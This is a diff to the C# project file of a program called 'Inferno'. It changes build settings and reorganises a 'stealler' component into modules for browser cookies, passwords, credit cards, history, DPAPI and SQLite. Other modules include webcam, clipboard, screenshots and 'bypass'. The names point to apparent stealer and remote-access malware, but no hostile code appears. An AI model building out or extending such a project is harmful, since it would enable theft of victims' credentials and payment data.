@@ -8,7 +8,7 @@
     <OutputType>Exe</OutputType>
     <RootNamespace>Inferno</RootNamespace>
     <AssemblyName>Inferno</AssemblyName>
-    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
     <Deterministic>true</Deterministic>
@@ -29,6 +29,7 @@
     <IsWebBootstrapper>false</IsWebBootstrapper>
     <UseApplicationTrust>false</UseApplicationTrust>
     <BootstrapperEnabled>true</BootstrapperEnabled>
+    <TargetFrameworkProfile />
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -39,6 +40,7 @@
     <DefineConstants>DEBUG;TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -48,6 +50,7 @@
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="AudioSwitcher.AudioApi, Version=3.0.0.209, Culture=neutral, PublicKeyToken=fda5729e2db3a64f, processorArchitecture=MSIL">
@@ -87,16 +90,21 @@
     <Compile Include="iModules\bypass.cs" />
     <Compile Include="iModules\core.cs" />
     <Compile Include="iModules\crypt.cs" />
-    <Compile Include="iModules\DPAPI.cs" />
     <Compile Include="iModules\evil.cs" />
     <Compile Include="iModules\clipboard.cs" />
     <Compile Include="iModules\desktopScreenshot.cs" />
     <Compile Include="iModules\monitor.cs" />
     <Compile Include="iModules\network.cs" />
     <Compile Include="iModules\power.cs" />
-    <Compile Include="iModules\SQLite.cs" />
     <Compile Include="iModules\status.cs" />
-    <Compile Include="iModules\stealler.cs" />
+    <Compile Include="iModules\stealler\Bookmarks.cs" />
+    <Compile Include="iModules\stealler\Cookies.cs" />
+    <Compile Include="iModules\stealler\CreditCards.cs" />
+    <Compile Include="iModules\stealler\Crypt.cs" />
+    <Compile Include="iModules\stealler\DPAPI.cs" />
+    <Compile Include="iModules\stealler\History.cs" />
+    <Compile Include="iModules\stealler\Passwords.cs" />
+    <Compile Include="iModules\stealler\SQLite.cs" />
     <Compile Include="iModules\taskmanager.cs" />
     <Compile Include="iModules\webcam.cs" />
     <Compile Include="Program.cs" />
@@ -128,6 +136,9 @@
       <ProductName>.NET Framework 3.5 SP1</ProductName>
       <Install>false</Install>
     </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <WCFMetadata Include="Connected Services\" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
